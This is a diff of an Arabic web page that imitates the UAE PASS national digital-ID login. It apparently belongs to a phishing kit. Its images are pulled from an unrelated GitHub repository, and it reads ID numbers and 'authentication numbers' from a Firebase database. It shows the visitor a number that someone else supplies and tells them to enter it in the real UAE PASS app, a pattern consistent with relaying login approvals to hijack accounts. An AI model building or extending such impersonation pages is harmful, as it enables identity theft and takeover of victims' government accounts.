@@ -17,10 +17,11 @@
     
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-    <script src="firebase-config.js?v=6"></script>
+    <script src="firebase-config.js?v=12"></script>
     
-    <title>UAE PASS - الموافقة على طلب تسجيل الدخول</title>
+    <title>UAE PASS - تمت المصادقة بنجاح</title>
     
     <style>
         /* CSS الأساسي */
@@ -33,7 +34,7 @@
         }
         
         .main-container {
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
@@ -165,13 +166,14 @@
 
         .passcode-card {
             color: #454F63;
-            width: 90px;
-            height: 90px;
-            margin: auto;
+            width: 120px;
+            height: 120px;
+            margin: 30px auto;
             position: relative;
             overflow: hidden;
-            border-radius: 16px;
+            border-radius: 20px;
             display: inline-block;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
         }
 
         .passcode-card::before {
@@ -184,8 +186,8 @@
                 #fff 0.375turn 0.5turn,
                 #fff 0.5turn 0.625turn,
                 #fff 0.625turn 0.75turn,
-                #20644B 0.75turn 0.875turn,
-                #20644B 0.875turn 1.0turn
+                #00ac75 0.75turn 0.875turn,
+                #00ac75 0.875turn 1.0turn
             );
             width: calc(100% * 1.41421356237);
             padding-bottom: calc(100% * 1.41421356237);
@@ -203,11 +205,12 @@
             inset: 0.15rem;
             background: #ECF3EC;
             border-radius: 0.85rem;
-            font-size: 52px;
+            font-size: 62px;
             font-style: normal;
-            font-weight: 400;
+            font-weight: 700;
             text-align: center;
-            line-height: 100px;
+            line-height: 120px;
+            color: #1B1B1F;
         }
 
         .uaepass-logo {
@@ -239,7 +242,7 @@
             font-style: normal;
             font-weight: 400;
             line-height: normal;
-            padding-top: 52px;
+            padding-top: 32px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -268,6 +271,7 @@
         .polling-footer {
             position: relative;
             width: 100%;
+            margin-top: 40px;
         }
 
         .ids-logo {
@@ -287,20 +291,18 @@
             color: #454f63;
         }
 
-        /* تنسيق إضافي للرقم المعروض */
+        /* تنسيقات إضافية */
         .passcode-info {
-            margin-top: 10px;
-            font-size: 14px;
+            margin-top: 20px;
+            font-size: 16px;
             color: #666;
             text-align: center;
-            display: none;
         }
         
         .main-content {
             display: none;
         }
         
-        /* حالة الاتصال */
         .connection-status {
             position: fixed;
             top: 10px;
@@ -313,6 +315,53 @@
             z-index: 10000;
         }
         
+        .success-message {
+            color: #00ac75;
+            font-size: 22px;
+            font-weight: 600;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .auth-number-display {
+            font-size: 3em;
+            color: #1B1B1F;
+            font-weight: 700;
+            margin: 30px 0;
+            padding: 20px;
+            background: #f8fff8;
+            border: 2px solid #00ac75;
+            border-radius: 15px;
+            text-align: center;
+        }
+        
+        .instructions {
+            background: #f0f9f0;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #555;
+        }
+        
+        .action-buttons {
+            margin-top: 30px;
+            text-align: center;
+        }
+        
+        .btn-success {
+            background: #00ac75;
+            border-color: #00ac75;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .btn-success:hover {
+            background: #009966;
+            border-color: #009966;
+        }
+
         /* CSS للإظهار والإخفاء حسب حجم الشاشة */
         @media only screen and (min-width: 601px) {
             .cancel-request-mobile,
@@ -364,25 +413,23 @@
                 font-size: 18px;
                 line-height: 1.5;
             }
+            
+            .passcode-card {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .passcode-card::after {
+                font-size: 48px;
+                line-height: 100px;
+            }
+            
+            .auth-number-display {
+                font-size: 2em;
+                padding: 15px;
+            }
         }
 
-        /* تأكد من إخفاء العناصر بشكل صحيح */
-        .card-content-right-mobile {
-            display: none;
-        }
-        
-        .card-content-right {
-            display: block;
-        }
-        
-        .cancel-request-mobile {
-            display: none;
-        }
-        
-        .cancel-request-div {
-            display: block;
-        }
-        
         /* شريط تقدم */
         .progress-container {
             width: 100%;
@@ -395,7 +442,7 @@
         
         .progress-bar {
             height: 6px;
-            background-color: #4CAF50;
+            background-color: #00ac75;
             width: 0%;
             transition: width 0.3s;
         }
@@ -419,8 +466,8 @@
             <div style="font-size: 60px; color: #00ac75; margin-bottom: 20px;">
                 <i class="fas fa-spinner fa-spin"></i>
             </div>
-            <h2 style="color: #454f63; margin-bottom: 10px;" id="loadingTitle">جاري الاتصال</h2>
-            <p style="color: #78849e;" id="loadingMessage">جاري التحضير...</p>
+            <h2 style="color: #454f63; margin-bottom: 10px;" id="loadingTitle">جاري تحضير رقم المصادقة</h2>
+            <p style="color: #78849e;" id="loadingMessage">جاري الاتصال بقاعدة البيانات...</p>
             
             <div class="progress-container">
                 <div class="progress-bar" id="progressBar"></div>
@@ -429,6 +476,10 @@
             
             <div id="firebaseStatus" style="margin-top: 20px; font-size: 14px; color: #666;">
                 <i class="fas fa-cloud"></i> جاري التحقق من اتصال قاعدة البيانات...
+            </div>
+            
+            <div id="errorMessage" style="margin-top: 20px; color: #ff4757; display: none;">
+                <i class="fas fa-exclamation-circle"></i> <span id="errorText"></span>
             </div>
         </div>
         
@@ -439,7 +490,7 @@
                 <div class="login-container-fluid header">
                     <div class="login-container flex">
                         <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/uae-pass-logo.png" alt="UAE PASS Logo" class="uaepass-logo">
-                        <div class="header-title">الموافقة على طلب تسجيل الدخول</div>
+                        <div class="header-title">تمت المصادقة بنجاح</div>
                     </div>
                 </div>
             </div>
@@ -447,86 +498,95 @@
             <!-- Main Content -->
             <div class="login-container-fluid">
                 <div class="login-container">
-                    <form id="loginForm" action="../../commonauth" method="post"
-                          enctype="application/x-www-form-urlencoded" autocomplete="off" novalidate>
+                    <div class="card login">
+                        <div class="card-header">
+                            <div>
+                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
+                            </div>
+                        </div>
                         
-                        <!-- Hidden Inputs -->
-                        <input id="username" name="username" type="hidden" value="">
-                        <input id="cancelOnWeb" type="hidden" name="cancelOnWeb" value="">
-                        <input id="tocommonauth" name="tocommonauth" type="hidden" value="true">
-                        <input id="password" name="password" type="hidden" value="">
-                        <input type="hidden" id="sessionDataKey" name="sessionDataKey" value='f9b79f82-8317-4f54-aa60-0cd566553e95' />
-                        
-                        <!-- New input for username from user -->
-                        <input type="hidden" id="usernameUserInput" name="usernameUserInput" value="">
+                        <div class="card-content">
+                            <!-- Left Content -->
+                            <div class="card-content-left">
+                                <div class="card-info">
+                                    <div class="info-title">
+                                        طلب تسجيل الدخول من
+                                    </div>
+                                    <div class="info-app-name">Self Service Portal</div>
 
-                        <!-- Login Card -->
-                        <div class="card login">
-                            <div class="card-header">
-                                <div>
-                                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
-                                </div>
-                                <div class="cancel-request-div">
-                                    <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
-                                        إلغاء الطلب
-                                    </button>
+                                    <!-- Mobile Image -->
+                                    <div class="card-content-right-mobile">
+                                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
+                                    </div>
+
+                                    <div class="info-description">
+                                        <span>تمت الموافقة على طلب تسجيل الدخول بنجاح</span>
+                                    </div>
+                                    
+                                    <!-- Success Message -->
+                                    <div class="success-message" id="successMessage">
+                                        <i class="fas fa-check-circle"></i> تمت المصادقة بنجاح!
+                                    </div>
+                                    
+                                    <!-- Passcode Display -->
+                                    <div class="card-info">
+                                        <div class="passcode-card" data-after-content="00" aria-label="الرمز" id="passcodeDisplay"></div>
+                                        <div class="passcode-info" id="passcodeInfo">
+                                            <div>رقم المصادقة الخاص بك</div>
+                                            <div class="auth-number-display" id="authNumberDisplay">--</div>
+                                            <div style="color: #777; font-size: 14px; margin-top: 10px;">
+                                                <i class="fas fa-clock"></i> صالح لمدة 5 دقائق
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Instructions -->
+                                    <div class="instructions" id="instructions">
+                                        <p><i class="fas fa-info-circle"></i> <strong>تعليمات الاستخدام:</strong></p>
+                                        <ol style="margin: 10px 0 0 20px; text-align: right;">
+                                            <li>افتح تطبيق UAE PASS على جهازك المحمول</li>
+                                            <li>ادخل هذا الرقم في حقل المصادقة</li>
+                                            <li>اتبع التعليمات المتبقية في التطبيق</li>
+                                            <li>سوف يتم توجيهك تلقائياً إلى النظام</li>
+                                        </ol>
+                                    </div>
+                                    
+                                    <!-- Action Buttons -->
+                                    <div class="action-buttons">
+                                        <button class="btn btn-success" onclick="copyAuthNumber()">
+                                            <i class="fas fa-copy"></i> نسخ الرقم
+                                        </button>
+                                        <button class="btn btn-outline-secondary" onclick="window.location.reload()" style="margin-right: 10px;">
+                                            <i class="fas fa-redo"></i> تحديث
+                                        </button>
+                                        <a href="apply.html" class="btn btn-outline-primary">
+                                            <i class="fas fa-home"></i> الصفحة الرئيسية
+                                        </a>
+                                    </div>
+                                    
+                                    <!-- Status Info -->
+                                    <div id="statusInfo" style="margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 10px; display: none;">
+                                        <p style="margin: 0; color: #555; font-size: 14px;">
+                                            <i class="fas fa-database"></i> 
+                                            <span id="dataSource">جاري التحميل...</span> | 
+                                            <span id="lastUpdate">--:--</span>
+                                        </p>
+                                    </div>
                                 </div>
                             </div>
                             
-                            <div class="card-content">
-                                <!-- Left Content -->
-                                <div class="card-content-left">
-                                    <div class="card-info">
-                                        <div class="info-title">
-                                            طلب تسجيل الدخول من
-                                        </div>
-                                        <div class="info-app-name">Self Service Portal</div>
-
-                                        <!-- Mobile Image -->
-                                        <div class="card-content-right-mobile">
-                                            <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
-                                        </div>
-
-                                        <div class="info-description">
-                                            <span>افتح تطبيق الهوية الرقمية الخاص بك، وأدخل الرقم الموضح لتسجيل الدخول</span>
-                                        </div>
-                                        
-                                        <!-- Passcode Display -->
-                                        <div class="card-info">
-                                            <div class="passcode-card" data-after-content="00" aria-label="الرمز" id="passcodeDisplay"></div>
-                                            <div class="passcode-info" id="passcodeInfo">
-                                                مصدر الرقم: <span id="numberSource">محلي</span>
-                                            </div>
-                                        </div>
-                                        
-                                        <!-- Waiting Status -->
-                                        <div class="waiting-confirmation">
-                                            <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/Timer.gif" alt="Timer" class="timer-img">
-                                            <span id="waitingText">في انتظار تأكيدك</span>
-                                        </div>
-
-                                        <!-- Mobile Cancel Button -->
-                                        <div class="cancel-request-mobile">
-                                            <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
-                                                إلغاء الطلب
-                                            </button>
-                                        </div>
-                                    </div>
-                                </div>
-                                
-                                <!-- Desktop Image -->
-                                <div class="card-content-right">
-                                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
-                                </div>
+                            <!-- Desktop Image -->
+                            <div class="card-content-right">
+                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
                             </div>
                         </div>
-                        
-                        <!-- Footer -->
-                        <div class="polling-footer">
-                            <img class="ids-logo" src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/n6.png" alt="IDS Logo" />
-                            <p class="poweredby"> Powered by UAE PASS </p>
-                        </div>
-                    </form>
+                    </div>
+                    
+                    <!-- Footer -->
+                    <div class="polling-footer">
+                        <img class="ids-logo" src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/n6.png" alt="IDS Logo" />
+                        <p class="poweredby"> Powered by UAE PASS </p>
+                    </div>
                 </div>
             </div>
         </div>
@@ -535,12 +595,13 @@
     <!-- JavaScript -->
     <script type="text/javascript">
         // ========== متغيرات النظام ==========
-        let checkInterval = null;
-        let firebaseListener = null;
-        let checkCount = 0;
-        const MAX_CHECKS = 300; // 5 دقائق (كل ثانية)
         let firebaseInitialized = false;
-        let firebaseRealtimeDb = null;
+        let firestoreDb = null;
+        let currentRecordId = null;
+        let currentAuthNumber = null;
+        let checkInterval = null;
+        let realtimeListener = null;
+        const urlParams = new URLSearchParams(window.location.search);
         
         // ========== دوال التقدم ==========
         function updateProgress(percent, message) {
@@ -551,9 +612,39 @@
             }
         }
         
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            const errorText = document.getElementById('errorText');
+            errorText.textContent = message;
+            errorDiv.style.display = 'block';
+        }
+        
+        function hideError() {
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+        
+        function updateConnectionStatus(status, message = '') {
+            const statusElement = document.getElementById('connectionStatus');
+            
+            switch(status) {
+                case 'متصل':
+                    statusElement.innerHTML = '<i class="fas fa-circle" style="color: #00ac75;"></i> متصل';
+                    break;
+                case 'جاري الاتصال':
+                    statusElement.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> جاري الاتصال...';
+                    break;
+                case 'خطأ':
+                    statusElement.innerHTML = '<i class="fas fa-circle" style="color: #ff4757;"></i> خطأ';
+                    break;
+                default:
+                    statusElement.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> جاري الاتصال...';
+            }
+        }
+        
         // ========== تهيئة Firebase ==========
         async function initializeFirebaseForSuccess() {
             updateProgress(20, 'جاري تهيئة قاعدة البيانات...');
+            updateConnectionStatus('جاري الاتصال');
             
             try {
                 // الطريقة 1: استخدام initializeFirebase من firebase-config.js
@@ -582,347 +673,457 @@
                 }
                 
                 if (firebaseInitialized) {
-                    // الحصول على Realtime Database
-                    firebaseRealtimeDb = window.firebaseRealtimeDb || 
-                                       (window.firebaseServices ? window.firebaseServices.realtimeDb() : null);
+                    // الحصول على Firestore
+                    firestoreDb = window.firebaseDb || 
+                                (window.firebaseServices ? window.firebaseServices.db() : null);
                     
                     // إذا لم تكن متاحة، حاول الحصول عليها مباشرة
-                    if (!firebaseRealtimeDb && typeof firebase !== 'undefined' && firebase.database) {
-                        firebaseRealtimeDb = firebase.database();
+                    if (!firestoreDb && typeof firebase !== 'undefined' && firebase.firestore) {
+                        firestoreDb = firebase.firestore();
                     }
                     
                     updateProgress(40, 'تم تهيئة قاعدة البيانات');
-                    console.log('✅ Firebase مهيئ لصفحة success');
-                    console.log('📡 Realtime DB:', !!firebaseRealtimeDb);
-                    
                     updateConnectionStatus('متصل');
+                    console.log('✅ Firebase مهيئ لصفحة success');
+                    console.log('📡 Firestore DB:', !!firestoreDb);
+                    
                     return true;
                 }
                 
                 updateProgress(30, 'لم يتم تهيئة قاعدة البيانات');
-                updateConnectionStatus('غير متصل', 'Firebase غير مهيئ');
+                updateConnectionStatus('خطأ', 'Firebase غير مهيئ');
+                showError('تعذر الاتصال بقاعدة البيانات. يرجى المحاولة لاحقاً.');
                 return false;
                 
             } catch (error) {
                 console.error('❌ خطأ في تهيئة Firebase:', error);
                 updateProgress(30, 'خطأ في تهيئة قاعدة البيانات');
                 updateConnectionStatus('خطأ', error.message);
+                showError('خطأ في الاتصال بقاعدة البيانات: ' + error.message);
                 return false;
             }
         }
         
-        // ========== دالة تحديث حالة الاتصال ==========
-        function updateConnectionStatus(status, message = '') {
-            const statusElement = document.getElementById('connectionStatus');
-            const firebaseStatus = document.getElementById('firebaseStatus');
+        // ========== الحصول على معرف السجل من URL ==========
+        function getRecordIdFromURL() {
+            const recordId = urlParams.get('recordId');
+            const authNumber = urlParams.get('authNumber');
             
-            switch(status) {
-                case 'متصل':
-                    statusElement.innerHTML = '<i class="fas fa-circle" style="color: #00ac75;"></i> متصل';
-                    firebaseStatus.innerHTML = '<i class="fas fa-check-circle" style="color: #00ac75;"></i> متصل بقاعدة البيانات';
-                    break;
-                case 'غير متصل':
-                    statusElement.innerHTML = '<i class="fas fa-circle" style="color: #ff9800;"></i> غير متصل';
-                    firebaseStatus.innerHTML = `<i class="fas fa-exclamation-triangle" style="color: #ff9800;"></i> غير متصل ${message}`;
-                    break;
-                case 'خطأ':
-                    statusElement.innerHTML = '<i class="fas fa-circle" style="color: #ff4757;"></i> خطأ';
-                    firebaseStatus.innerHTML = `<i class="fas fa-times-circle" style="color: #ff4757;"></i> خطأ: ${message}`;
-                    break;
-                default:
-                    statusElement.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> جاري الاتصال...';
-                    firebaseStatus.innerHTML = '<i class="fas fa-cloud"></i> جاري التحقق من اتصال قاعدة البيانات...';
+            if (recordId) {
+                currentRecordId = recordId;
+                localStorage.setItem('currentRecordId', recordId);
+            } else {
+                // محاولة استرجاع من localStorage
+                currentRecordId = localStorage.getItem('currentRecordId');
+            }
+            
+            if (authNumber) {
+                currentAuthNumber = authNumber;
+                localStorage.setItem('currentAuthNumber', authNumber);
+            }
+            
+            console.log('📋 معلومات URL:', { recordId, authNumber, fromStorage: currentRecordId });
+            return { recordId: currentRecordId, authNumber: currentAuthNumber };
+        }
+        
+        // ========== البحث عن السجل في Firestore ==========
+        async function findAuthRecord(recordId) {
+            if (!firestoreDb) {
+                throw new Error('Firestore غير متاح');
+            }
+            
+            try {
+                console.log('🔍 البحث عن السجل:', recordId);
+                const docRef = firestoreDb.collection('id_numbers').doc(recordId);
+                const docSnap = await docRef.get();
+                
+                if (docSnap.exists) {
+                    const data = docSnap.data();
+                    console.log('✅ وجدت السجل:', data);
+                    
+                    // تحقق من أن هناك رقم مصادقة
+                    if (data.authNumber && data.authNumber !== null && data.waiting === false) {
+                        return {
+                            found: true,
+                            recordId: recordId,
+                            data: data,
+                            source: 'firestore'
+                        };
+                    } else {
+                        return {
+                            found: false,
+                            reason: 'no_auth_number',
+                            data: data
+                        };
+                    }
+                } else {
+                    console.log('❌ السجل غير موجود:', recordId);
+                    return {
+                        found: false,
+                        reason: 'not_found'
+                    };
+                }
+            } catch (error) {
+                console.error('❌ خطأ في البحث عن السجل:', error);
+                throw error;
             }
         }
         
-        // ========== دالة للاستماع للتحديثات الفورية من Firebase ==========
-        function setupFirebaseRealtimeListener() {
-            if (!firebaseRealtimeDb) {
-                console.warn('⚠️ Realtime Database غير متاح للإستماع للتحديثات');
+        // ========== البحث عن السجلات برقم الهوية ==========
+        async function searchByIdNumber(idNumber) {
+            if (!firestoreDb) {
+                throw new Error('Firestore غير متاح');
+            }
+            
+            try {
+                console.log('🔍 البحث برقم الهوية:', idNumber);
+                
+                const querySnapshot = await firestoreDb.collection('id_numbers')
+                    .where('idNumber', '==', idNumber)
+                    .orderBy('timestamp', 'desc')
+                    .limit(5)
+                    .get();
+                
+                if (!querySnapshot.empty) {
+                    for (const doc of querySnapshot.docs) {
+                        const data = doc.data();
+                        if (data.authNumber && data.authNumber !== null && data.waiting === false) {
+                            console.log('✅ وجدت سجلاً مكتملاً:', doc.id);
+                            return {
+                                found: true,
+                                recordId: doc.id,
+                                data: data,
+                                source: 'search_by_id'
+                            };
+                        }
+                    }
+                }
+                
+                return {
+                    found: false,
+                    reason: 'no_completed_records'
+                };
+                
+            } catch (error) {
+                console.error('❌ خطأ في البحث برقم الهوية:', error);
+                throw error;
+            }
+        }
+        
+        // ========== عرض رقم المصادقة ==========
+        function displayAuthNumber(authNumber, source = 'firestore') {
+            try {
+                // تنسيق الرقم (إضافة صفر أمام الرقم إذا كان أقل من 10)
+                const formattedNumber = authNumber < 10 ? '0' + authNumber : authNumber.toString();
+                
+                // تحديث passcode card
+                const passcodeCard = document.getElementById('passcodeDisplay');
+                if (passcodeCard) {
+                    passcodeCard.setAttribute('data-after-content', formattedNumber);
+                    
+                    // إضافة تأثير
+                    passcodeCard.style.transform = 'scale(1.1)';
+                    setTimeout(() => {
+                        passcodeCard.style.transform = 'scale(1)';
+                    }, 300);
+                }
+                
+                // تحديث عرض الرقم الكبير
+                const authNumberDisplay = document.getElementById('authNumberDisplay');
+                if (authNumberDisplay) {
+                    authNumberDisplay.textContent = authNumber;
+                    authNumberDisplay.style.color = '#00ac75';
+                }
+                
+                // تحديث معلومات المصدر
+                const dataSource = document.getElementById('dataSource');
+                if (dataSource) {
+                    dataSource.textContent = `المصدر: ${source}`;
+                }
+                
+                // تحديث وقت آخر تحديث
+                const lastUpdate = document.getElementById('lastUpdate');
+                if (lastUpdate) {
+                    const now = new Date();
+                    lastUpdate.textContent = `آخر تحديث: ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
+                }
+                
+                // إظهار قسم المعلومات
+                const statusInfo = document.getElementById('statusInfo');
+                if (statusInfo) {
+                    statusInfo.style.display = 'block';
+                }
+                
+                console.log('✅ تم عرض رقم المصادقة:', authNumber, 'من:', source);
+                return true;
+                
+            } catch (error) {
+                console.error('❌ خطأ في عرض رقم المصادقة:', error);
+                return false;
+            }
+        }
+        
+        // ========== نسخ الرقم إلى الحافظة ==========
+        function copyAuthNumber() {
+            if (!currentAuthNumber) {
+                alert('لا يوجد رقم مصادقة للنسخ');
+                return;
+            }
+            
+            navigator.clipboard.writeText(currentAuthNumber.toString())
+                .then(() => {
+                    // إظهار رسالة نجاح
+                    const originalText = document.querySelector('.btn-success').innerHTML;
+                    document.querySelector('.btn-success').innerHTML = '<i class="fas fa-check"></i> تم النسخ';
+                    document.querySelector('.btn-success').style.backgroundColor = '#28a745';
+                    
+                    setTimeout(() => {
+                        document.querySelector('.btn-success').innerHTML = originalText;
+                        document.querySelector('.btn-success').style.backgroundColor = '';
+                    }, 2000);
+                    
+                    console.log('✅ تم نسخ رقم المصادقة:', currentAuthNumber);
+                })
+                .catch(err => {
+                    console.error('❌ خطأ في النسخ:', err);
+                    alert('تعذر نسخ الرقم. يرجى المحاولة يدوياً.');
+                });
+        }
+        
+        // ========== إعداد المراقبة في الوقت الحقيقي ==========
+        function setupRealtimeMonitoring(recordId) {
+            if (!firestoreDb || !recordId) {
+                console.warn('⚠️ لا يمكن إعداد المراقبة: Firestore غير متاح أو معرف السجل مفقود');
                 return null;
             }
             
             try {
-                return firebaseRealtimeDb.ref('current_auth_number').on('value', (snapshot) => {
-                    const firebaseNumber = snapshot.val();
-                    if (firebaseNumber) {
-                        console.log('📡 تم استلام تحديث من Firebase Realtime:', firebaseNumber);
-                        
-                        const numberData = {
-                            number: firebaseNumber.number,
-                            formattedNumber: firebaseNumber.formattedNumber,
-                            timestamp: firebaseNumber.timestamp,
-                            source: firebaseNumber.source || 'firebase_realtime_update'
-                        };
-                        
-                        // تحديث العرض
-                        loadAndDisplayNumber(numberData, 'Firebase Realtime');
-                        
-                        // حفظ في localStorage
-                        localStorage.setItem('auth_passcode_number', JSON.stringify(numberData));
-                        localStorage.setItem('last_firebase_number', JSON.stringify(firebaseNumber));
-                    }
-                }, (error) => {
-                    console.error('❌ خطأ في مستمع Firebase:', error);
-                });
+                console.log('👂 إعداد المراقبة في الوقت الحقيقي للسجل:', recordId);
+                
+                const unsubscribe = firestoreDb.collection('id_numbers').doc(recordId)
+                    .onSnapshot((doc) => {
+                        if (doc.exists) {
+                            const data = doc.data();
+                            console.log('🔄 تحديث مباشر:', {
+                                authNumber: data.authNumber,
+                                waiting: data.waiting,
+                                status: data.status
+                            });
+                            
+                            // إذا تم تحديث رقم المصادقة
+                            if (data.authNumber && data.authNumber !== null && data.waiting === false) {
+                                currentAuthNumber = data.authNumber;
+                                displayAuthNumber(data.authNumber, 'تحديث مباشر من Firebase');
+                                
+                                // حفظ في localStorage
+                                localStorage.setItem('currentAuthNumber', data.authNumber);
+                            }
+                        }
+                    }, (error) => {
+                        console.error('❌ خطأ في المراقبة المباشرة:', error);
+                    });
+                
+                return unsubscribe;
+                
             } catch (error) {
                 console.warn('⚠️ لا يمكن إعداد مستمع Firebase:', error);
                 return null;
             }
         }
         
-        // ========== دالة التحقق من رقم المصادقة ==========
-        async function checkForNumber() {
+        // ========== البحث عن رقم المصادقة ==========
+        async function findAuthNumber() {
             updateProgress(60, 'جاري البحث عن رقم المصادقة...');
             
             try {
-                let numberData = null;
+                const urlInfo = getRecordIdFromURL();
+                let authNumber = null;
                 let source = '';
                 
-                // أولاً: جرب Firebase Realtime Database
-                if (firebaseRealtimeDb) {
-                    try {
-                        const snapshot = await firebaseRealtimeDb.ref('current_auth_number').once('value');
-                        const firebaseNumber = snapshot.val();
-                        
-                        if (firebaseNumber) {
-                            numberData = {
-                                number: firebaseNumber.number,
-                                formattedNumber: firebaseNumber.formattedNumber,
-                                timestamp: firebaseNumber.timestamp,
-                                source: firebaseNumber.source || 'firebase_realtime'
-                            };
-                            source = 'Firebase Realtime Database';
-                            
-                            // حفظ نسخة في localStorage للنسخ الاحتياطي
-                            localStorage.setItem('auth_passcode_number', JSON.stringify(numberData));
-                            localStorage.setItem('last_firebase_number', JSON.stringify(firebaseNumber));
-                        }
-                    } catch (firebaseError) {
-                        console.warn('⚠️ خطأ في الوصول إلى Firebase:', firebaseError);
-                    }
+                // المحاولة 1: من URL مباشرة
+                if (urlInfo.authNumber) {
+                    authNumber = urlInfo.authNumber;
+                    source = 'URL مباشر';
+                    currentAuthNumber = authNumber;
+                    console.log('✅ وجدت في URL:', authNumber);
                 }
                 
-                // إذا لم ينجح Firebase، جرب localStorage
-                if (!numberData) {
-                    const savedNumber = localStorage.getItem('auth_passcode_number');
+                // المحاولة 2: من localStorage
+                if (!authNumber) {
+                    const savedNumber = localStorage.getItem('currentAuthNumber');
                     if (savedNumber) {
-                        try {
-                            numberData = JSON.parse(savedNumber);
-                            source = 'التخزين المحلي';
-                        } catch (e) {
-                            console.warn('⚠️ خطأ في قراءة بيانات localStorage:', e);
+                        authNumber = savedNumber;
+                        source = 'التخزين المحلي';
+                        currentAuthNumber = authNumber;
+                        console.log('✅ وجدت في localStorage:', authNumber);
+                    }
+                }
+                
+                // المحاولة 3: البحث في Firestore باستخدام recordId
+                if (!authNumber && urlInfo.recordId && firestoreDb) {
+                    const recordResult = await findAuthRecord(urlInfo.recordId);
+                    if (recordResult.found) {
+                        authNumber = recordResult.data.authNumber;
+                        source = recordResult.source;
+                        currentAuthNumber = authNumber;
+                        console.log('✅ وجدت في Firestore (باستخدام recordId):', authNumber);
+                    }
+                }
+                
+                // المحاولة 4: البحث في Firestore باستخدام رقم الهوية من localStorage
+                if (!authNumber && firestoreDb) {
+                    const lastIdNumber = localStorage.getItem('lastIdNumber');
+                    if (lastIdNumber) {
+                        const searchResult = await searchByIdNumber(lastIdNumber);
+                        if (searchResult.found) {
+                            authNumber = searchResult.data.authNumber;
+                            source = searchResult.source;
+                            currentRecordId = searchResult.recordId;
+                            currentAuthNumber = authNumber;
+                            console.log('✅ وجدت في Firestore (باستخدام رقم الهوية):', authNumber);
                         }
                     }
                 }
                 
-                // إذا وجدنا الرقم
-                if (numberData) {
-                    updateProgress(80, 'تم العثور على الرقم');
-                    return { numberData, source, found: true };
+                if (authNumber) {
+                    updateProgress(80, 'تم العثور على رقم المصادقة');
+                    
+                    // عرض الرقم
+                    displayAuthNumber(authNumber, source);
+                    
+                    // إعداد المراقبة في الوقت الحقيقي إذا كان هناك recordId
+                    if (currentRecordId) {
+                        realtimeListener = setupRealtimeMonitoring(currentRecordId);
+                    }
+                    
+                    return {
+                        found: true,
+                        authNumber: authNumber,
+                        source: source,
+                        recordId: currentRecordId
+                    };
                 } else {
-                    // تحديث رسالة التحميل
-                    checkCount++;
-                    const minutes = Math.floor(checkCount / 60);
-                    const seconds = checkCount % 60;
+                    updateProgress(70, 'لم يتم العثور على رقم مصادقة');
                     
-                    updateProgress(70, `جاري الانتظار... (${minutes}:${seconds.toString().padStart(2, '0')})`);
+                    // بدء الفحص الدوري
+                    startPeriodicChecking();
                     
-                    // إذا تجاوز الحد الأقصى للفحص
-                    if (checkCount >= MAX_CHECKS) {
-                        document.getElementById('loadingMessage').innerHTML = 
-                            '<span style="color: #ff4757;">تجاوز وقت الانتظار.</span>';
-                        
-                        return { found: false, timeout: true };
-                    }
-                    
-                    return { found: false, timeout: false };
+                    return {
+                        found: false,
+                        message: 'لم يتم العثور على رقم مصادقة'
+                    };
                 }
+                
             } catch (error) {
-                console.error('❌ خطأ في فحص الرقم:', error);
-                return { found: false, error: error.message };
+                console.error('❌ خطأ في البحث عن رقم المصادقة:', error);
+                updateProgress(70, 'خطأ في البحث');
+                showError('خطأ في البحث عن البيانات: ' + error.message);
+                return {
+                    found: false,
+                    error: error.message
+                };
             }
         }
         
-        // ========== دالة لتحميل وعرض الرقم المحفوظ ==========
-        function loadAndDisplayNumber(numberData, source) {
-            try {
-                const number = numberData.number;
-                const formattedNumber = numberData.formattedNumber || (number < 10 ? '0' + number : number.toString());
-                
-                // عرض الرقم في passcode-card
-                const passcodeCard = document.getElementById('passcodeDisplay');
-                if (passcodeCard) {
-                    passcodeCard.setAttribute('data-after-content', formattedNumber);
-                    passcodeCard.setAttribute('aria-label', `الرمز ${formattedNumber}`);
-                    
-                    // إضافة تأثير مرئي
-                    passcodeCard.style.transform = 'scale(1.1)';
-                    setTimeout(() => {
-                        passcodeCard.style.transform = 'scale(1)';
-                    }, 300);
-                    
-                    // عرض مصدر الرقم (اختياري)
-                    const passcodeInfo = document.getElementById('passcodeInfo');
-                    const numberSource = document.getElementById('numberSource');
-                    if (passcodeInfo && numberSource) {
-                        numberSource.textContent = source;
-                        passcodeInfo.style.display = 'block';
-                    }
-                    
-                    console.log('✅ تم تحميل وعرض الرقم:', formattedNumber, 'من:', source);
